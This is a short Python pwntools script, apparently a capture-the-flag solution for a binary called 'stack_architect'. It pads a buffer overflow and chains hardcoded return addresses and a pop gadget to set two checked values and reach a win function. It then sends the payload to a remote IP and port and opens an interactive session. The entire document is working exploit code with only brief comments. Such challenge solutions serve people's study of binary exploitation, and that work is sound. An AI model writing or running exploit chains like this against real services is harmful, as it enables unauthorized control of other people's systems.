from pwn import *
func1_addr = 0x0804929e
a_value = 0x20010508

func2_addr = 0x080492fe
v1_value = 0x8052001

win_addr = 0x08049216

# get the pop edi
pop_edi = 0x08049421

# buffer 
payload = b'A'*4 + b"I'm sorry, don't leave me, I want you here with me ~~"
payload = payload.ljust(0x58, b"\x00")

# call func1 first time for check2 and call again to check a
payload += p32(func1_addr) + p32(func1_addr) + p32(pop_edi)
# change the value a
payload += p32(a_value) + p32(pop_edi)
# change v1 and call func2
payload += p32(v1_value) + p32(func2_addr)
payload += p32(win_addr)
#p = process("./stack_architect")
p = remote("45.122.249.68", 10018)
print(payload)
p.sendline(payload)
p.interactive()